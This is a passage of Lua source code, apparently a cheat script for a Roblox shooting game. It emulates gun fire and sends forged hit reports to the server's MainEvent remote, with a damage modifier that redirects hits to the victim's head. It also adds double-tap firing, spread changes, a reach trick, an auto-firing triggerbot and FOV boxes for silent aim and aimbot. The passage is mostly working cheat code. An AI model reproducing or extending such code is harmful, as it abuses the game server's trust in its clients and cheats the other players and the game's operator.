							elseif typeof(CustomRot) == 'table' then
								ImpactClone.CFrame = ImpactClone.CFrame * CustomRot[1] * CFrame.Angles(MathRad(CustomRot[2].X), MathRad(CustomRot[2].Y), MathRad(CustomRot[2].Z));
							else
								ImpactClone.CFrame = ImpactClone.CFrame * CFrame.Angles(MathRad(CustomRot.X), MathRad(CustomRot.Y), MathRad(CustomRot.Z));
							end;
						elseif ImpactClone:IsA('Part') then
							ImpactClone.CFrame = BulletHole.CFrame;
						end;
						BulletHole.Parent = BulletPart.Parent;
						for _, Desc in next, BulletHole:GetDescendants() do
							if Desc:IsA('ParticleEmitter') then
								Desc:Emit(Desc:GetAttribute('EmitCount') or 1);
							end;
						end;
					end;
				end, ErrHandler);
			end;
		end);
	end;

	local function PlayGunSound(SoundHandle, ShouldClone)
		local ShootSound = SoundHandle:FindFirstChild('ShootSound');
		if not ShootSound then return end;
		if SkinName and SkinName ~= 'Default' and SkinAssets then
			local GunShootSounds = SkinAssets:FindFirstChild('GunShootSounds');
			if GunShootSounds then
				local WeaponFolder = GunShootSounds:FindFirstChild(ToolName);
				if WeaponFolder then
					local SoundValue = WeaponFolder:FindFirstChild(SkinName);
					if SoundValue and SoundValue:IsA('StringValue') and SoundValue.Value ~= '' then
						ShootSound.SoundId = SoundValue.Value;
					end;
				end;
			end;
		end;
		local SeqSFX = ShootSound:GetAttribute('SequenceSFX');
		if SeqSFX then
			if ShootSound:GetAttribute('CurrentSequence') == nil then
				ShootSound:SetAttribute('CurrentSequence', 1);
			else
				ShootSound:SetAttribute('CurrentSequence', ShootSound:GetAttribute('CurrentSequence') + 1);
			end;
			local Seq = ShootSound:GetAttribute('CurrentSequence');
			local Ids = {};
			for Id in string.gmatch(SeqSFX, '%d+') do
				table.insert(Ids, Id);
			end;
			if #Ids > 0 then
				ShootSound.SoundId = 'rbxassetid://' .. Ids[Seq % #Ids + 1];
			end;
		end;
		if ShouldClone then
			local Clone = ShootSound:Clone();
			Clone.Name = '\0';
			Clone.Parent = SoundHandle;
			Clone:Play();
			Clone.Ended:Once(function()
				if Clone and Clone.Parent then Clone:Destroy() end;
			end);
		else
			ShootSound:Play();
		end;
	end;

	local IsShotgunType = ShotgunWeapons[ToolName] or false;
	if IsShotgunType then
		if not Handle:GetAttribute('PlayingSound') then
			Handle:SetAttribute('PlayingSound', true);
			Delay(0.075, function()
				if Handle and Handle.Parent then Handle:SetAttribute('PlayingSound', nil) end;
			end);
			Spawn(function()
				if not SoundsPlaying[Handle] then
					PlayGunSound(Handle, true);
					SoundsPlaying[Handle] = true;
					Delay(0.021, function() SoundsPlaying[Handle] = nil end);
				end;
			end);
		end;
	elseif SkinName == 'Toilet' then
		local ToiletSounds = { 125391056005695, 132466522418892, 129999172684348 };
		local SoundObj = Instance.new('Sound');
		SoundObj.Name = 'ShootSound';
		SoundObj.SoundId = 'rbxassetid://' .. ToiletSounds[MathRandom(1, #ToiletSounds)];
		SoundObj.Parent = Handle;
		SoundObj.Ended:Once(function() SoundObj:Destroy() end);
		SoundObj:Play();
	else
		Spawn(function()
			if not SoundsPlaying[Handle] then
				PlayGunSound(Handle, true);
				SoundsPlaying[Handle] = true;
				Delay(0.021, function() SoundsPlaying[Handle] = nil end);
			end;
		end);
	end;

	local SkinMuzzleUsed = false;
	Spawn(function()
		if not SkinAssets then return end;
		local MuzzleParticles = SkinAssets:FindFirstChild('GunSkinMuzzleParticle');
		if not MuzzleParticles then return end;
		local WeaponMuzzle = MuzzleParticles:FindFirstChild(ToolName);
		if WeaponMuzzle then
			local MuzzleFolder = WeaponMuzzle:FindFirstChild('Muzzle');
			if MuzzleFolder then
				DoMuzzleEmit(MuzzleFolder, Shooter);
			else
				DoMuzzleEmit(WeaponMuzzle, Shooter);
			end;
			SkinMuzzleUsed = true;
		else
			local SkinMuzzle = MuzzleParticles:FindFirstChild(SkinName);
			if SkinMuzzle then
				local MuzzleFolder = SkinMuzzle:FindFirstChild('Muzzle');
				if MuzzleFolder then
					local DiffGunMuzzle = MuzzleFolder:FindFirstChild('Different_GunMuzzle');
					if DiffGunMuzzle and DiffGunMuzzle:FindFirstChild(ToolName) then
						DoMuzzleEmit(DiffGunMuzzle[ToolName], Shooter);
					else
						DoMuzzleEmit(MuzzleFolder, Shooter);
					end;
					SkinMuzzleUsed = true;
				else
					local SingleEmitter = SkinMuzzle:FindFirstChildOfClass('ParticleEmitter');
					if SingleEmitter then
						local MuzzleAtt = nil;
						local ToolModel = Handle.Parent;
						if ToolModel then
							local Default = ToolModel:FindFirstChild('Default');
							if Default then
								local Mesh = Default:FindFirstChild('Mesh');
								if Mesh then MuzzleAtt = Mesh:FindFirstChild('Muzzle') end;
							end;
						end;
						if not MuzzleAtt then MuzzleAtt = Handle:FindFirstChild('Muzzle') end;
						if MuzzleAtt then
							local Clone = SingleEmitter:Clone();
							Clone.Rotation = NumberRange.new(MathRandom(-180, 180));
							Clone.RotSpeed = NumberRange.new(MathRandom(-90, 90));
							Clone.Parent = MuzzleAtt;
							Clone:Emit(1);
							SkinMuzzleUsed = true;
						end;
					end;
				end;
			end;
		end;
	end);

	Xpcall(function()
		local ShootBBGUI = Handle.Parent.Handle:FindFirstChild('ShootBBGUI');
		if ShootBBGUI then
			ShootBBGUI.Enabled = not SkinMuzzleUsed;
		end;
	end, ErrHandler);

	local Light = Instance.new('PointLight');
	Light.Brightness = 0.5;
	Light.Range = 15;
	Light.Shadows = false;
	Light.Color = Color3.new(1, 1, 1);
	Light.Parent = BulletPart;
	local LightTween = TweenService:Create(Light, TweenInfo.new(0.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.In), { Range = 0 });
	LightTween:Play();
	local LightConn;
	LightConn = LightTween.Completed:Connect(function()
		if Light then Light:Destroy() end;
		LightConn:Disconnect();
	end);

	local BodyEffects = Shooter:FindFirstChild('BodyEffects');
	if BodyEffects then
		local Movement = BodyEffects:FindFirstChild('Movement');
		if Movement then
			local ReduceWalk = Instance.new('IntValue');
			ReduceWalk.Name = 'ReduceWalk';
			ReduceWalk.Value = 5;
			ReduceWalk.Parent = Movement;
			local ShootCooldown = Handle.Parent and Handle.Parent:FindFirstChild('ShootingCooldown');
			local Duration = ShootCooldown and tonumber(ShootCooldown.Value) or 0.3;
			Delay(Duration, function()
				if ReduceWalk and ReduceWalk.Parent then ReduceWalk:Destroy() end;
			end);
		end;
	end;

	Spawn(function()
		Animate(Handle.Parent);
	end);

	return HitPosition, HitInstance, HitNormal;
end;

function GetDoubleTapCount(ToolName)
	local DTCfg = GetConfig()['Weapon Modifications']['Double Tap'];
	if not DTCfg['Enabled'] then return 1 end;
	if not State.DoubleTapActive then return 1 end;

	local WeaponConfigs = DTCfg['Weapon Configs'];
	if WeaponConfigs and WeaponConfigs['Enabled'] then
		local WClass = GetWeaponClass(ToolName);
		local WConfig = WeaponConfigs[WClass];
		if WConfig and not WConfig['Enabled'] then
			return 1;
		end;
	end;

	return 2; 
end;

local DamageModifierLib = nil;
do
	local DamageModifier = {}

	DamageModifier.DefaultConfig = {
		Enabled = true,
		Weapons = {
			Shotguns = {
				Enabled = true,
				Mode = 'half',
			},
			Pistols = {
				Enabled = true,
				Mode = 'full',
			},
			Others = {
				Enabled = true,
				Mode = 'full',
			},
		},
	}

	DamageModifier.ShotgunWeapons = {
		['[Double-Barrel SG]'] = true,
		['[TacticalShotgun]'] = true,
		['[Tactical Shotgun]'] = true,
		['[Tactical-Shotgun]'] = true,
		['[Shotgun]'] = true,
		['[Drum-Shotgun]'] = true,
	}

	DamageModifier.PistolWeapons = {
		['[Revolver]'] = true,
		['[Silencer]'] = true,
		['[Glock]'] = true,
		['[Deagle]'] = true,
	}

	function DamageModifier.GetWeaponClass(toolName)
		if DamageModifier.ShotgunWeapons[toolName] then
			return 'Shotguns'
		end

		if DamageModifier.PistolWeapons[toolName] then
			return 'Pistols'
		end

		return 'Others'
	end

	function DamageModifier.GetOverridePart(character, mode)
		if not character then
			return nil
		end

		if mode == 'full' then
			return character:FindFirstChild('Head')
		end

		if mode == 'half' then
			return character:FindFirstChild('HumanoidRootPart')
		end
		
		if mode == 'min' then
			return character:FindFirstChild('Right Leg') or character:FindFirstChild('RightLeg')
		end

		return nil
	end

	function DamageModifier.GetConfig(config)
		return config or DamageModifier.DefaultConfig
	end

	function DamageModifier.Apply(toolName, hitPosition, hitInstance, hitNormal, config, getWeaponClass)
		config = DamageModifier.GetConfig(config)

		if not config or not config.Enabled or not hitInstance or not hitInstance.Parent then
			return hitPosition, hitInstance, hitNormal
		end

		local weapons = config.Weapons
		if not weapons then
			return hitPosition, hitInstance, hitNormal
		end

		local resolveWeaponClass = getWeaponClass or DamageModifier.GetWeaponClass
		local weaponClass = resolveWeaponClass(toolName)
		local weaponConfig = weapons and weapons[weaponClass]
		if not weaponConfig or not weaponConfig.Enabled then
			return hitPosition, hitInstance, hitNormal
		end

		local character = hitInstance:FindFirstAncestorOfClass('Model')
		if not character or not character:FindFirstChildOfClass('Humanoid') then
			return hitPosition, hitInstance, hitNormal
		end

		local override = DamageModifier.GetOverridePart(character, weaponConfig.Mode)
		if not override then
			return hitPosition, hitInstance, hitNormal
		end

		return hitPosition, override, hitNormal
	end

	DamageModifierLib = DamageModifier
end;

function ApplyDamageModifierHit(ToolName, HitPosition, HitInstance, HitNormal)
	local DmgCfg = {['Enabled']=false};
	if DamageModifierLib and type(DamageModifierLib.Apply) == 'function' then
		return DamageModifierLib.Apply(ToolName, HitPosition, HitInstance, HitNormal, DmgCfg, GetWeaponClass);
	end;

	if not DmgCfg or not DmgCfg['Enabled'] or not HitInstance or not HitInstance.Parent then
		return HitPosition, HitInstance, HitNormal;
	end;

	local Weapons = DmgCfg['Weapons'];
	if not Weapons then
		return HitPosition, HitInstance, HitNormal;
	end;

	local WeaponClass = GetWeaponClass(ToolName);
	local WeaponCfg = Weapons[WeaponClass];
	if not WeaponCfg or not WeaponCfg['Enabled'] then
		return HitPosition, HitInstance, HitNormal;
	end;

	local Character = HitInstance:FindFirstAncestorOfClass('Model');
	if not Character or not Character:FindFirstChildOfClass('Humanoid') then
		return HitPosition, HitInstance, HitNormal;
	end;

	local Override = nil;
	if WeaponCfg['Mode'] == 'full' then
		Override = Character:FindFirstChild('Head');
	elseif WeaponCfg['Mode'] == 'half' then
		Override = Character:FindFirstChild('HumanoidRootPart');
	elseif WeaponCfg['Mode'] == 'min' then
		Override = Character:FindFirstChild('Right Leg') or Character:FindFirstChild('RightLeg');
	end;

	if not Override then
		return HitPosition, HitInstance, HitNormal;
	end;

	return HitPosition, Override, HitNormal;
end;

EmulateGunFire = function(Tool)
	local Character = LocalPlayer.Character;
	if not Character then return end;
	if _G.GUN_COMBAT_TOGGLE then return end;
	if not CanShoot(Character) then return end;

	local Handle = Tool:FindFirstChild('Handle');
	if not Handle then return end;
	local Ammo = Tool:FindFirstChild('Ammo');
	if not Ammo or Ammo.Value <= 0 then
		local NoAmmo = Handle:FindFirstChild('NoAmmo');
		if NoAmmo then NoAmmo:Play() end;
		return;
	end;
	local Range = Tool:FindFirstChild('Range');
	local RangeValue = Range and Range.Value or 200;

	local RemoteEvent = Tool:FindFirstChild('RemoteEvent');
	local ToolRemote = RemoteEvent or { FireServer = function() end };

	local MuzzlePos = GetMuzzlePosition(Tool);
	if not MuzzlePos then return end;
	return ___REMOVED_RunAutoReachShot(MuzzlePos, function(ReachedMuzzlePos)
		MuzzlePos = ReachedMuzzlePos;

		local IsShotgun = ShotgunWeapons[Tool.Name] or false;

		ShootRayParams.FilterDescendantsInstances = BuildFilter(ShootFilter, Character);

		ToolRemote:FireServer('Shoot');

		local DoubleTapCount = GetDoubleTapCount(Tool.Name);
		for _dt = 1, DoubleTapCount do
			if IsShotgun then
				local ServerTime = Workspace:GetServerTimeNow();
				local SpreadMult = 1;
				local SpreadCfg = GetConfig()['Weapon Modifications']['Spread Modifications'];
				if SpreadCfg['Enabled'] then
					SpreadMult = SpreadCfg['Value'] or 1;
					local Rand = SpreadCfg['Randomizer'];
					if Rand and Rand['Enabled'] then
						local Min = Rand['Min'] or 1;
						local Max = Rand['Max'] or 1;
						local Alpha = MathRandom();
						SpreadMult = SpreadMult * (Min + (Max - Min) * Alpha);
					end;
				end;
				for PelletIndex = 1, 5 do
					local SpreadX = (MathRandom() > 0.5 and MathRandom() * 0.05 or -MathRandom() * 0.05) * SpreadMult;
					local SpreadY = (MathRandom() > 0.5 and MathRandom() * 0.1 or -MathRandom() * 0.1) * SpreadMult;
					local SpreadZ = (MathRandom() > 0.5 and MathRandom() * 0.05 or -MathRandom() * 0.05) * SpreadMult;
					local Spread = Vector3New(SpreadX, SpreadY, SpreadZ);

					local AimPos = GetAimPosition(MuzzlePos, RangeValue);
					local AimDir = (AimPos - MuzzlePos).Unit + Spread;
					local AimPosition = MuzzlePos + AimDir * RangeValue;

					local HitPosition, HitInstance, HitNormal;
					if _dt == 1 then
						HitPosition, HitInstance, HitNormal = ShowPellet(Character, Handle, MuzzlePos, AimPosition, RangeValue);
					end;
					if not HitPosition then
						local Direction = AimDir * RangeValue;
						local RayResult = Workspace:Raycast(MuzzlePos, Direction, ShootRayParams);
						HitPosition = RayResult and RayResult.Position or (MuzzlePos + Direction);
						HitInstance = RayResult and RayResult.Instance or nil;
						HitNormal = RayResult and RayResult.Normal or Vector3New(0, 1, 0);
					end;
					HitPosition, HitInstance, HitNormal = ApplyDamageModifierHit(Tool.Name, HitPosition, HitInstance, HitNormal);

					ReplicatedStorage.MainEvent:FireServer('ShootGun', Handle, MuzzlePos, HitPosition, HitInstance, HitNormal, ServerTime);
				end;
			else
				local AimPos = GetAimPosition(MuzzlePos, RangeValue);
				local AimPosition = MuzzlePos + (AimPos - MuzzlePos).Unit * RangeValue;

				local HitPosition, HitInstance, HitNormal;
				if _dt == 1 then
					HitPosition, HitInstance, HitNormal = ShowPellet(Character, Handle, MuzzlePos, AimPosition, RangeValue);
				end;
				if not HitPosition then
					local Direction = (AimPos - MuzzlePos).Unit * RangeValue;
					local RayResult = Workspace:Raycast(MuzzlePos, Direction, ShootRayParams);
					HitPosition = RayResult and RayResult.Position or (MuzzlePos + Direction);
					HitInstance = RayResult and RayResult.Instance or nil;
					HitNormal = RayResult and RayResult.Normal or Vector3New(0, 1, 0);
				end;
				HitPosition, HitInstance, HitNormal = ApplyDamageModifierHit(Tool.Name, HitPosition, HitInstance, HitNormal);

				ReplicatedStorage.MainEvent:FireServer('ShootGun', Handle, MuzzlePos, HitPosition, HitInstance, HitNormal);
			end;
		end;

		ToolRemote:FireServer();
	end);
end;

CachedMainEvent = nil;

HookedTools = {};
function HookGunActivation(Character)
	if not Character then return end;
	Character.ChildAdded:Connect(function(Child)
		if not Child:IsA('Tool') then return end;
		if not MuzzleOffsets[Child.Name] then return end;
		if HookedTools[Child] then return end;
		HookedTools[Child] = true;
		local LastFire = 0;

		local function GetCooldown()
			return GetToolFireDelay(Child);
		end;
		local IsAuto = AutoWeapons[Child.Name] or false;
		local IsBurst = BurstWeapons[Child.Name] or false;

		Child.Activated:Connect(function()
			State.IsShooting = true;
			local Cooldown = GetCooldown();
			if IsAuto then
				if Tick() - LastFire < Cooldown + 0.0095 then return end;
				LastFire = Tick();
				local Firing = true;
				Spawn(function()
					while Firing and Child.Parent == Character do
						EmulateGunFire(Child);
						Wait(Cooldown + 0.0095);
						LastFire = Tick();
					end;
				end);
				Child.Deactivated:Wait();
				Firing = false;
				State.IsShooting = false;
			elseif IsBurst then
				if false then
					if Tick() - LastFire < Cooldown + 0.0095 then return end;
					LastFire = Tick();
					local Firing = true;
					Spawn(function()
						while Firing and Child.Parent == Character do
							EmulateGunFire(Child);
							Wait(Cooldown + 0.0095);
							LastFire = Tick();
						end;
					end);
					Child.Deactivated:Wait();
					Firing = false;
					State.IsShooting = false;
				else
					local Tolerance = 0.3;
					Pcall(function()
						local TC = Child:FindFirstChild('ToleranceCooldown');
						if TC then Tolerance = TC.Value end;
					end);
					if Tick() - LastFire < Tolerance then return end;
					LastFire = Tick();
					local BurstCount = 3;
					Xpcall(function()
						local Ammo = Child:FindFirstChild('Ammo');
						if Ammo then BurstCount = MathMin(BurstCount, Ammo.Value) end;
					end, ErrHandler);
					Spawn(function()
						for _ = 1, BurstCount do
							EmulateGunFire(Child);
							Wait(Cooldown + 0.0095);
						end;
					end);
				end;
			else
				if Tick() - LastFire < Cooldown + 0.0095 then return end;
				LastFire = Tick();
				EmulateGunFire(Child);
				State.IsShooting = false;
			end;
		end);
		Child.Deactivated:Connect(function()
			State.IsShooting = false;
		end);
	end);
end;

GetClosestPlayerToCursor = function(MaxRange, AllowOffscreen, ChecksKey)
	local CurrentCamera = Workspace.CurrentCamera;
	local MousePosition = UserInputService:GetMouseLocation();
	local CamPos = CurrentCamera.CFrame.Position;
	local CamLook = CurrentCamera.CFrame.LookVector;
	local Closest = nil;
	local ClosestDist = MathHuge;

	for _, Player in next, Players:GetPlayers() do
		if Player == LocalPlayer then continue end;
		if not PassesConditions(Player, ChecksKey) then continue end;

		local Character = Player.Character;
		if not Character then continue end;
		local HumanoidRootPart = Character:FindFirstChild('HumanoidRootPart');
		if not HumanoidRootPart then continue end;

		if MaxRange and MaxRange < MathHuge then
			local WorldDist = (CamPos - HumanoidRootPart.Position).Magnitude;
			if WorldDist > MaxRange then continue end;
		end;

		local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(HumanoidRootPart.Position);

		if AllowOffscreen then
			local ToTarget = (HumanoidRootPart.Position - CamPos).Unit;
			local Dot = CamLook:Dot(ToTarget);
			if Dot <= 0 then continue end;
			local Magnitude;
			if OnScreen and ScreenPos.Z > 0 then
				Magnitude = (Vector2New(ScreenPos.X, ScreenPos.Y) - MousePosition).Magnitude;
			else
				Magnitude = (1 - Dot) * 10000;
			end;
			if Magnitude < ClosestDist then
				Closest = Player;
				ClosestDist = Magnitude;
			end;
		else
			if not OnScreen then continue end;
			if ScreenPos.Z <= 0 then continue end;
			local Magnitude = (Vector2New(ScreenPos.X, ScreenPos.Y) - MousePosition).Magnitude;
			if Magnitude < ClosestDist then
				Closest = Player;
				ClosestDist = Magnitude;
			end;
		end;
	end;
	return Closest;
end;

function ActivateTool()
	local Character = LocalPlayer.Character;
	if not Character then return end;
	local Tool = Character:FindFirstChildOfClass('Tool');
	if Tool and Tool:IsDescendantOf(Character) and Tool.Name ~= '[Knife]' then
		Tool:Activate();
	end;
end;

local RageFire;

function TriggerShot(Cooldown, Tool, Handle, ToolName, Origin, AimPosition, GunRange)
	local Now = DateTime.now().UnixTimestampMillis;
	if Now - State.LastTriggerShot >= Cooldown * 1000 then
		State.LastTriggerShot = Now;
		___REMOVED_RunAutoReachShot(Origin, function(FiredOrigin)
			local AimOffset = AimPosition - FiredOrigin;
			local AimDistance = AimOffset.Magnitude;
			if AimDistance <= 0 then return end;
			local Direction = AimOffset / AimDistance;
			local SpreadCfg = GetConfig()['Weapon Modifications']['Spread Modifications'];
			local SpreadConfig = SpreadCfg['Enabled'] and SpreadCfg or nil;
			local DoubleTapCount = GetDoubleTapCount(ToolName);
			for _ = 1, DoubleTapCount do
				RageFire(Tool, Handle, ToolName, FiredOrigin, Direction, GunRange, SpreadConfig);
			end;
		end, AimPosition);
	end;
end;

RunTriggerbot = function()
	local TriggerCfg = GetConfig()['Triggerbot'];
	if not TriggerCfg['Enabled'] then return end;
	if not State.TriggerState then return end;

	local Target = State.Targets.Triggerbot;
	local TargetChar = Target and Target.Character;
	if not TargetChar then return end;

	local Character = LocalPlayer.Character;
	if not Character then return end;
	local Tool = Character:FindFirstChildOfClass('Tool');
	if not Tool or not Tool:FindFirstChild('Ammo') or Tool.Name == '[Knife]' then return end;
	if not State.CanTriggerbotShoot then return end;

	local Humanoid = Character:FindFirstChild('Humanoid');
	if not Humanoid or Humanoid.Health <= 0 then return end;
	local BodyEffects = Character:FindFirstChild('BodyEffects');
	if not BodyEffects then return end;
	if BodyEffects:FindFirstChild('K.O') and BodyEffects['K.O'].Value then return end;
	if BodyEffects:FindFirstChild('Reload') and BodyEffects.Reload.Value then return end;
	if BodyEffects:FindFirstChild('Dead') and BodyEffects.Dead.Value then return end;

	if not PassesConditions(Target, 'Triggerbot') then return end;

	local SelfHRP = Character:FindFirstChild('HumanoidRootPart');
	local TargetHRP = TargetChar:FindFirstChild('HumanoidRootPart');
	if not SelfHRP or not TargetHRP then return end;

	local TargetDist = (SelfHRP.Position - TargetHRP.Position).Magnitude;
	local TrigMaxRange = TriggerCfg['Max Distance'] or MathHuge;
	if TargetDist > TrigMaxRange then return end;

	local Handle = Tool:FindFirstChild('Handle');
	if not Handle then return end;
	local ToolName = Tool.Name;

	local RangeChild = Tool:FindFirstChild('Range');
	local GunRange = RangeChild and RangeChild.Value or 200;

	if TriggerCfg['Weapon Range'] then
		local RangeOrigin = GetMuzzlePosition(Tool) or SelfHRP.Position;
		local ReachCfg = ({['Enabled']=false});
		if ReachCfg and ReachCfg['Enabled'] then
			RangeOrigin = ComputeReachOrigin(RangeOrigin, TargetHRP.Position, ReachCfg);
		end;
		if (RangeOrigin - TargetHRP.Position).Magnitude > GunRange then return end;
	end;

	local CurrentCamera = Workspace.CurrentCamera;
	local ViewportY = CurrentCamera.ViewportSize.Y;
	local CamFOV = CurrentCamera.FieldOfView;

	local AimPos = TargetHRP.Position;
	local PredCfg = TriggerCfg['Prediction'];
	if PredCfg and PredCfg['Enabled'] == true then
		local Vel = GetDeltaVelocity(TargetHRP);
		AimPos = AimPos + Vector3New(Vel.X * (PredCfg['X'] or 0.13), Vel.Y * (PredCfg['Y'] or 0.13), Vel.Z * (PredCfg['Z'] or 0.13));
	end;

	local ScreenPos, OnScreen = CurrentCamera:WorldToViewportPoint(AimPos);
	if not OnScreen then return end;

	local HitCheck = TriggerCfg['Mode'] or 'FOV';
	local ShouldFire = false;

	if HitCheck == 'Player' then
		local Mouse = LocalPlayer:GetMouse();
		local MouseTarget = Mouse.Target;
		ShouldFire = MouseTarget and MouseTarget:IsDescendantOf(TargetChar);
	else
		local MouseLoc = UserInputService:GetMouseLocation();
		local Delta = Vector2New(ScreenPos.X, ScreenPos.Y) - MouseLoc;
		local TrigFOV = GetConfig()['Triggerbot']['FOV'];
		local Depth = ScreenPos.Z;
		if Depth <= 1 then return end;
		local ScaleFactor = (TargetHRP.Size.Y * ViewportY) / (Depth * 2) * 80 / CamFOV;
		local TrigShape = false;
		if TrigShape == 'Circle' then
			local R = 9e9 * ScaleFactor;
			ShouldFire = not (TrigFOV['Visible'] or TrigFOV['Visualize'])['Enabled'] or (Delta.X * Delta.X + Delta.Y * Delta.Y <= R * R);
		else
			local ScaledW = GetFovSize(TrigFOV['X'], 9e9) * ScaleFactor;
			local ScaledH = GetFovSize(TrigFOV['Y'], 9e9) * ScaleFactor;
			ShouldFire = not (TrigFOV['Visible'] or TrigFOV['Visualize'])['Enabled'] or (MathAbs(Delta.X) <= ScaledW / 2 and MathAbs(Delta.Y) <= ScaledH / 2);
		end;
	end;

	if ShouldFire then
		local Origin = GetMuzzlePosition(Tool) or SelfHRP.Position;
		if not CachedMainEvent then CachedMainEvent = ReplicatedStorage:FindFirstChild('MainEvent') end;
		if not CachedMainEvent then return end;
		local TriggerDelay = TriggerCfg['Delay'] or 0;
		local WeaponDelay = GetToolFireDelay(Tool);
		local EffectiveDelay = MathMax(TriggerDelay, WeaponDelay);
		TriggerShot(EffectiveDelay, Tool, Handle, ToolName, Origin, AimPos, GunRange);
	end;
end;

SilentTargetLocked = false;

UtilityUI = Instance.new('ScreenGui');
UtilityUI.Name = 'gravityui';
UtilityUI.IgnoreGuiInset = true;
UtilityUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
UtilityUI.Parent = CoreGui;

function CreateSquare()
	local Obj = {
		_Size = Vector2New(0, 0),
		_Position = Vector2New(0, 0),
		_Color = Color3.new(1, 1, 1),
		_Visible = false,
		_Filled = false,
		_Thickness = 1,
		_Transparency = 1,
	};
	local Frame = Instance.new('Frame');
	Frame.BorderSizePixel = 0;
	Frame.BackgroundTransparency = 1;
	Frame.BackgroundColor3 = Obj._Color;
	Frame.Visible = Obj._Visible;
	Frame.Parent = UtilityUI;
	local Stroke = Instance.new('UIStroke');
	Stroke.Thickness = Obj._Thickness;
	Stroke.Enabled = true;
	Stroke.LineJoinMode = Enum.LineJoinMode.Miter;
	Stroke.Parent = Frame;
	local Corner = Instance.new('UICorner');
	Corner.CornerRadius = UDim.new(0, 0);
	Corner.Parent = Frame;
	local Proxy = {};
	local Meta = {
		__newindex = function(_, Key, Value)
			if Key == 'Size' then
				Obj._Size = Value;
				Frame.Size = UDim2.fromOffset(Value.X, Value.Y);
			elseif Key == 'Round' then
				Obj._Round = Value;
				Corner.CornerRadius = Value and UDim.new(1, 0) or UDim.new(0, 0);
			elseif Key == 'Position' then
				Obj._Position = Value;
				Frame.Position = UDim2.fromOffset(Value.X, Value.Y);
			elseif Key == 'Color' then
				Obj._Color = Value;
				Frame.BackgroundColor3 = Value;
				Stroke.Color = Value;
			elseif Key == 'Visible' then
				Obj._Visible = Value;
				Frame.Visible = Value;
			elseif Key == 'Filled' then
				Obj._Filled = Value;
				Frame.BackgroundTransparency = Value and MathClamp(1 - Obj._Transparency, 0, 1) or 1;
				Stroke.Enabled = not Value;
			elseif Key == 'Thickness' then
				Obj._Thickness = Value;
				Stroke.Thickness = MathClamp(Value, 0.6, 0x7FFFFFFF);
			elseif Key == 'Transparency' then
				Obj._Transparency = Value;
				local Alpha = MathClamp(1 - Value, 0, 1);
				Frame.BackgroundTransparency = Obj._Filled and Alpha or 1;
				Stroke.Transparency = Alpha;
			end;
		end,
		__index = function(_, Key)
			if Key == 'Remove' or Key == 'Destroy' then
				return function() Frame:Destroy() end;
			elseif Key == 'Size' then return Obj._Size;
			elseif Key == 'Round' then return Obj._Round;
			elseif Key == 'Position' then return Obj._Position;
			elseif Key == 'Color' then return Obj._Color;
			elseif Key == 'Visible' then return Obj._Visible;
			elseif Key == 'Filled' then return Obj._Filled;
			elseif Key == 'Thickness' then return Obj._Thickness;
			elseif Key == 'Transparency' then return Obj._Transparency;
			end;
			return nil;
		end,
	};
	return setmetatable(Proxy, Meta);
end;

function CreateLine()
	local Obj = {
		_From = Vector2New(0, 0),
		_To = Vector2New(0, 0),
		_Color = Color3.new(1, 1, 1),
		_Visible = false,
		_Thickness = 1,
		_Transparency = 1,
	};
	local Frame = Instance.new('Frame');
	Frame.AnchorPoint = Vector2New(0.5, 0.5);
	Frame.BorderSizePixel = 0;
	Frame.BackgroundColor3 = Obj._Color;
	Frame.Visible = Obj._Visible;
	Frame.BackgroundTransparency = 0;
	Frame.Size = UDim2.new();
	Frame.Parent = UtilityUI;
	local function UpdateLine()
		local Dir = Obj._To - Obj._From;
		local Center = (Obj._To + Obj._From) / 2;
		local Mag = Dir.Magnitude;
		local Theta = MathDeg(MathAtan2(Dir.Y, Dir.X));
		Frame.Position = UDim2.fromOffset(Center.X, Center.Y);
		Frame.Rotation = Theta;
		Frame.Size = UDim2.fromOffset(Mag, Obj._Thickness);
	end;
	local Proxy = {};
	local Meta = {
		__newindex = function(_, Key, Value)
			if Key == 'From' then
				Obj._From = Value;
				UpdateLine();
			elseif Key == 'To' then
				Obj._To = Value;
				UpdateLine();
			elseif Key == 'Color' then
				Obj._Color = Value;
				Frame.BackgroundColor3 = Value;
			elseif Key == 'Visible' then
				Obj._Visible = Value;
				Frame.Visible = Value;
			elseif Key == 'Thickness' then
				Obj._Thickness = Value;
				UpdateLine();
			elseif Key == 'Transparency' then
				Obj._Transparency = Value;
				Frame.BackgroundTransparency = MathClamp(1 - Value, 0, 1);
			end;
		end,
		__index = function(_, Key)
			if Key == 'Remove' or Key == 'Destroy' then
				return function() Frame:Destroy() end;
			elseif Key == 'From' then return Obj._From;
			elseif Key == 'To' then return Obj._To;
			elseif Key == 'Color' then return Obj._Color;
			elseif Key == 'Visible' then return Obj._Visible;
			elseif Key == 'Thickness' then return Obj._Thickness;
			elseif Key == 'Transparency' then return Obj._Transparency;
			end;
			return nil;
		end,
	};
	return setmetatable(Proxy, Meta);
end;

SilentFOVBox = CreateSquare();
SilentFOVBox.Visible = false;
SilentFOVBox.Filled = false;
SilentFOVBox.Thickness = 1;
SilentFOVBox.Transparency = 1;

TriggerFOVBox = CreateSquare();
TriggerFOVBox.Visible = false;
TriggerFOVBox.Filled = false;
TriggerFOVBox.Thickness = 1;
TriggerFOVBox.Transparency = 1;

AimbotFOVBox = CreateSquare();
AimbotFOVBox.Visible = false;
AimbotFOVBox.Filled = false;
AimbotFOVBox.Thickness = 1;
AimbotFOVBox.Transparency = 1;


SilentFOVOutColor = Color3.fromRGB(255, 255, 255);
SilentFOVInColor = Color3.fromRGB(100, 180, 255);
TriggerFOVOutColor = Color3.fromRGB(255, 255, 255);
TriggerFOVInColor = Color3.fromRGB(100, 180, 255);
AimbotFOVOutColor = Color3.fromRGB(255, 255, 255);
AimbotFOVInColor = Color3.fromRGB(100, 180, 255);



function CreateTextLabel()
	local Obj = {
		_Text = '',
		_Size = 13,
		_Position = Vector2New(0, 0),
		_Color = Color3.new(1, 1, 1),
		_Visible = false,
		_Center = false,
		_Outline = true,
		_OutlineColor = Color3.new(0, 0, 0),
		_Transparency = 1,
		_FontFace = nil,
	};

	local Label = Instance.new('TextLabel');
	Label.AnchorPoint = Vector2New(0.5, 0.5);
	Label.BorderSizePixel = 0;
	Label.BackgroundTransparency = 1;
	Label.RichText = true;
	Label.Font = Enum.Font.SourceSansBold;
	Label.TextSize = Obj._Size;
	Label.TextColor3 = Obj._Color;
	Label.Visible = Obj._Visible;
	Label.Text = '';
	Label.Parent = UtilityUI;

	local Stroke = Instance.new('UIStroke');
	Stroke.Thickness = 1;
